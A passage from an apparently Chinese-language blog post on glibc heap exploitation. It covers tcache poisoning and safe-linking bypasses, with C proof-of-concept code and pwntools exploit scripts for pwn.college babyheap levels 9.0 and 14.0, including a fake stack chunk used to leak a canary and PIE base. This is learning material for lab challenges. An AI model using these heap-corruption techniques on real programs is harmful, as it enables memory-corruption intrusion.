class="line"></span><br><span class="line">tcache_entry fake_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="type">size_t</span> * chunk1;</span><br><span class="line">  <span class="type">size_t</span> * chunk2;</span><br><span class="line">  <span class="type">size_t</span> * victim;</span><br><span class="line"></span><br><span class="line">  fake_chunk.next = <span class="number">0xcafebabe</span>;</span><br><span class="line">  fake_chunk.key = <span class="number">0xdeadbeef</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fake_chunk @ %p\n&quot;</span>,&amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  <span class="built_in">free</span>(chunk1);</span><br><span class="line">  <span class="built_in">free</span>(chunk2);</span><br><span class="line"></span><br><span class="line">  chunk2[<span class="number">0</span>] = chunk1[<span class="number">0</span>] ^ (<span class="type">size_t</span>)(&amp;fake_chunk);</span><br><span class="line">  </span><br><span class="line">  chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">  victim = (tcache_entry *)<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;victim = %p\n&quot;</span>,victim);</span><br><span class="line">  assert(victim == &amp;fake_chunk);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# gcc safe_poison.c -o safe_poison -g -w</span><br><span class="line">root@Executor:/mnt/c/Users/86135/Desktop/pwncollege/software/heap/test# ./safe_poison    </span><br><span class="line">fake_chunk @ 0x55fe8ca46020</span><br><span class="line">victim = 0x55fe8ca46020</span><br></pre></td></tr></table></figure>
<h5 id="safe-linking-metadata-poisoning-memory-leak">[safe-linking]
metadata poisoning memory leak</h5>
<p>使用<code>tcache entry poisoning</code>之后一直<code>malloc</code>把假堆块拿出来</p>
<p>此时<code>fake_chunk.next</code>值会被“解密”然后挂载<code>tcache.entries[idx]</code></p>
<p>具体过程是这样的:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcache.entries[idx] =&gt; fake_chunk -&gt; fake_chunk.next</span><br></pre></td></tr></table></figure>
<p>当<code>fake_chunk</code>要从链条上拿走时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ep =  &amp;tcache-&gt;entries[tc_idx]	//ep就是桶子头</span><br><span class="line">e = *ep				//e 就是fake_chunk</span><br><span class="line">*ep = REVEAL_PTR(e-&gt;next);		//新ep指向</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcache-&gt;entries[tc_idx] = REVEAL_PTR(fake_chunk-&gt;next)</span><br><span class="line">						= ( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next</span><br></pre></td></tr></table></figure>
<p>我们想要泄露的是<code>fake_chunk.next</code>,</p>
<p>现在我们知道的是<code>fake_chunk_addr</code></p>
<p>还需要知道一个<code>tcache-&gt;entries[tc_idx]</code></p>
<p>接下来再释放一个堆块<code>chunk0</code>进入<code>tcache</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk0.next = PROTECT_PTR(chunk0_addr,tcache-&gt;entries[tc_idx])</span><br><span class="line">			= ( chunk0_addr &gt;&gt; 12 ) ^ [( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next]</span><br></pre></td></tr></table></figure>
<p>因此最终得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk.next = chunk0.next ^ (chunk0 &gt;&gt; 12) ^ (fake_chunk_addr &gt;&gt; 12)</span><br></pre></td></tr></table></figure>
<p>写个<code>poc</code>意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> flag_low;</span><br><span class="line">    <span class="type">size_t</span> flag_high;</span><br><span class="line">&#125;Secret;</span><br><span class="line"></span><br><span class="line">Secret secret=&#123;</span><br><span class="line">    .flag_low = <span class="number">0x0011223344556677</span>,</span><br><span class="line">    .flag_high = <span class="number">0x8899aabbccddeeff</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">void</span> <span class="title function_">print_secret</span><span class="params">(Secret *s)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret @ %p\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_low = %p\n&quot;</span>, s-&gt;flag_low);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_high = %p\n&quot;</span>, s-&gt;flag_high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk0;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line">    <span class="type">size_t</span> chunk0_next;</span><br><span class="line">    <span class="type">size_t</span> chunk1_next;</span><br><span class="line">    <span class="type">size_t</span> chunk2_next;</span><br><span class="line">    <span class="type">size_t</span> ep;</span><br><span class="line">    <span class="type">size_t</span> leak;</span><br><span class="line"></span><br><span class="line">    chunk0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk1_next = chunk1[<span class="number">0</span>];         <span class="comment">//chunk1_next = page number</span></span><br><span class="line">    chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">    chunk2[<span class="number">0</span>] = chunk1_next ^ (<span class="type">size_t</span>)(&amp;secret);</span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">// remove secret.flag_high</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    chunk0_next = chunk0[<span class="number">0</span>];</span><br><span class="line">    ep = chunk1_next ^ chunk0_next;         <span class="comment">//tcache entry</span></span><br><span class="line">    leak = ep ^ ((<span class="type">size_t</span>)(&amp;secret)&gt;&gt;<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak = %p\n&quot;</span>, leak);</span><br><span class="line">    print_secret(&amp;secret);</span><br><span class="line">    assert(leak == secret.flag_low);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">└─# gcc safe_metadata.c -o safe_metadata -g -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">└─# ./safe_metadata</span><br><span class="line">leak = 0x11223344556677</span><br><span class="line">secret @ 0x5599e7a02030</span><br><span class="line">secret.flag_low = 0x11223344556677</span><br><span class="line">secret.flag_high = (nil)</span><br></pre></td></tr></table></figure>
<p>注意glibc2.35之后堆块的对齐要求, 堆块的地址必须是0x10对齐的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span> <span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e;</span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">    e = *ep;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line">	<span class="comment">//MALLOC_ALIGN_MASK = 0xf</span></span><br></pre></td></tr></table></figure>
<p>但是glibc2.31及之前是可以对齐到0x8的</p>
<h3 id="glibc-2.35">glibc-2.35</h3>
<p>ubuntu22.04上使用glibc-2.35,其数据结构与算法基本上和glibc2.38相</p>
<h2 id="pwn.college">pwn.college</h2>
<table>
<thead>
<tr>
<th>ubuntu发行版</th>
<th>glibc版本</th>
<th>调试工具</th>
</tr>
</thead>
<tbody>
<tr>
<td>16.04</td>
<td>2.23</td>
<td>gef</td>
</tr>
<tr>
<td>18.04</td>
<td>2.27</td>
<td>pwndbg for ubuntu18.04</td>
</tr>
<tr>
<td>20.04</td>
<td>2.31</td>
<td>pwndbg for ubuntu20.04</td>
</tr>
<tr>
<td>22.04</td>
<td>2.35</td>
<td>pwndbg</td>
</tr>
</tbody>
</table>
<blockquote>
<p>pwndbg for ubuntu18.04的安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 71c4e1d</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
<p>pwndbg for ubuntu20.04的安装方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 26ba400</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="level1---uaf">level1 - UAF</h3>
<h3 id="level2--">level2 -</h3>
<h3 id="level9.0">level9.0</h3>
<p><code>secret</code>位于 <code>0x427C72</code></p>
<p>然而<code>malloc</code>检查地址必须在<code>0x430000</code>之上</p>
<p>如此一来,
<strong>通过<code>UAF tcache poisoning</code>把<code>0x427C72</code>作为假堆块挂到<code>tcache</code>中,
然后<code>malloc</code>拿出来打印其内容</strong>的思路就失效了,
因为<code>malloc</code>不让我们拿出这个假堆块来</p>
<p>虽然我们拿不出假堆块来,但是投毒会传染给元数据</p>
<p><strong>具体来说:</strong></p>
<p>1.通过<code>UAF</code>对<code>tcache</code>中的真堆块投毒,使得
<strong>假堆块@0x427C72</strong> 进入<code>tcache</code></p>
<p>2.<code>malloc</code>拿出真堆块</p>
<p>3.<code>malloc</code>拿出假堆块,</p>
<p>此时假堆块的<code>next</code>值,就是<code>secret[0-7]</code></p>
<p>此时假堆块的<code>key</code>值,就是<code>secret[8-15]</code></p>
<p><code>tcache</code>元数据会继承 <strong>假堆块.next</strong>,</p>
<p>并且假堆块在被重新分配时,<code>key</code>值会被置零,也就是说<code>secret[8-15] = 0</code></p>
<p>4.重复上述步骤,但是这次<strong>假堆块@0x427C72 - 8</strong></p>
<p>如此<code>secret[0-7]</code>也会被置0</p>
<p>如此一来,我们根本不需要知道<code>secret</code>是多少,直接放零蛋</p>
<blockquote>
<p>glibc2.31中,tcache的堆块不会有对齐要求</p>
<p>同样的思路在glibc2.35上就更加困难了,一个是有safe-linking
,二个是tcache堆块必须对齐到0x10</p>
<p>glibc2.35中可以泄露低8字节,归零高8字节</p>
</blockquote>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./babyheap_level9.0&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;/challenge/babyheap_level9.0&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    size=<span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index,size = <span class="number">0</span></span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;You win! Here is your flag:\n&#x27;</span>)</span><br><span class="line">    flag = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    scanf(<span class="number">0</span>,p64(addr))</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">1</span>,<span class="number">0x10</span>)          <span class="comment"># get fake_chunk out of tcache</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    data = puts(<span class="number">5</span>,<span class="number">8</span>)</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x427C72</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># secret_high = leak(secret_addr+8)       # no need to know secret_high which will be overwritten to zero by the next step</span></span><br><span class="line">leak(secret_addr)          <span class="comment"># secret_high will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line">leak(secret_addr - <span class="number">8</span>)      <span class="comment"># secret_low will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#secret was reset to 0 after 2 leak</span></span><br><span class="line">secret = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">send_flag(secret)</span><br></pre></td></tr></table></figure>
<h3 id="level14.0">level14.0</h3>
<p>程序中有一个<code>win</code>函数，可以<code>ret2text</code></p>
<p>但是程序开启了<code>pie</code>保护，因此需要先泄露<code>pie base</code></p>
<p>允许堆栈上溢出构造假堆块，并<code>free</code>进入<code>tcache</code>,</p>
<p>由于栈上有<code>canary</code>并且溢出长度有限,
因此需要利用假堆块进行泄露或者篡改返回地址</p>
<blockquote>
<p>buffer视角:</p>
<table>
<thead>
<tr>
<th></th>
<th>offset</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
<td></td>
<td>低</td>
</tr>
<tr>
<td><strong>buffer</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td><strong>chunk_mem</strong></td>
<td><strong>+ 0x40</strong></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>==buffer_end==</td>
<td>+ 0x7f</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x168</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>高</td>
</tr>
</tbody>
</table>
<p>堆块视角:</p>
<table>
<thead>
<tr>
<th>prev_size</th>
<th>- 0x10</th>
<th>低</th>
</tr>
</thead>
<tbody>
<tr>
<td>size</td>
<td>- 0x8</td>
<td></td>
</tr>
<tr>
<td><strong>chunkmem</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x58</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x128</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>高</td>
</tr>
</tbody>
</table>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usable_size = 0x130</span><br><span class="line">chunk_size = (0x130+0x10) | 1 = 0x141</span><br></pre></td></tr></table></figure>
<p>此时<code>chunkmem + 0x48</code>处是<code>main</code>栈帧中的<code>canary</code>所在地</p>
<p>此时<code>chunkmem + 0x58</code>处是<code>main</code>函数的返回地址,
正常情况下是<code>__libc_start_main+243 @ glibc</code>处</p>
<p>此时<code>chunkmem + 0x128</code>处是<code>__libc_start_main</code>函数返回地址,
正常情况下是<code>_start+46 @ babylevel14.0</code>处</p>
<p>正好两个地址一个可以泄露<code>libc_base</code>,
一个可以泄露<code>pie_base</code>, 当然,
本题中只需要泄露<code>pie_base</code></p>
<p>接下来就可以在<code>chunkmem</code>上溢出</p>
<p>综上</p>
<p>1.在堆栈上构造假堆块, 大小涵盖两个返回地址</p>
<p>2.下一次<code>malloc</code>拿到假堆块,
打印泄露<code>canary</code>和两个返回地址,
计算得到<code>pie_base</code></p>
<p>3.在假堆块上溢出</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level14.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level14.0&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,n = <span class="number">6</span></span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(offset)</span><br><span class="line">  p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">  data = p.recv(n)</span><br><span class="line">  data = data[::-<span class="number">1</span>]</span><br><span class="line">  data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># data = int(data,16)</span></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_free</span>():</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_scanf</span>(<span class="params">content</span>):</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_scanf&#x27;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#1.堆栈溢出构造假堆块并释放，使之进入tcache</span></span><br><span class="line"></span><br><span class="line">usable_size = <span class="number">0x130</span></span><br><span class="line">chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>     <span class="comment">#1 means previous chunk is in use</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(chunk_size)</span><br><span class="line">stack_scanf(buffer)</span><br><span class="line">stack_free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.通过假堆块泄露返回地址上的值, 泄露canary</span></span><br><span class="line">canary_offset = <span class="number">0x48</span></span><br><span class="line">main_retaddr_offset = <span class="number">0x58</span></span><br><span class="line">__libc_start_main_retaddr_offset = <span class="number">0x128</span></span><br><span class="line">malloc(<span class="number">1</span>,usable_size)</span><br><span class="line">main_retaddr_value = echo(<span class="number">1</span>,main_retaddr_offset)</span><br><span class="line">__libc_start_main_retaddr_value = echo(<span class="number">1</span>,__libc_start_main_retaddr_offset)</span><br><span class="line">canary = echo(<span class="number">1</span>,canary_offset+<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">canary = canary &lt;&lt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line">start_offset = <span 